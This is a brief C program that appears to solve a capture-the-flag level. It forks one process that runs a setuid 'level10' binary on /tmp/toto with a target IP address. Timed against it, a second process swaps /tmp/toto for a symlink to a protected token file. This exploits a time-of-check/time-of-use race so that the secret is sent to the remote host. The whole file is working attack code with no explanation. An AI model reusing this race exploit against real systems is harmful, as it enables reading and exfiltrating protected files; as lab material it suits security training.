#include <unistd.h>

int	main()
{
	pid_t	pid;
	char	*args1[] = {"/home/user/level10/level10", "/tmp/toto", "192.168.13.1", NULL};
	char	*args2[] = {"/bin/ln", "-sf", "/home/user/level10/token", "/tmp/toto", NULL};

	pid = fork();
	if (pid == 0)
	{
		execve(args1[0], args1, NULL);
	}
	else
	{
		usleep(300);
		execve(args2[0], args2, NULL);
	}
	return (0);
}
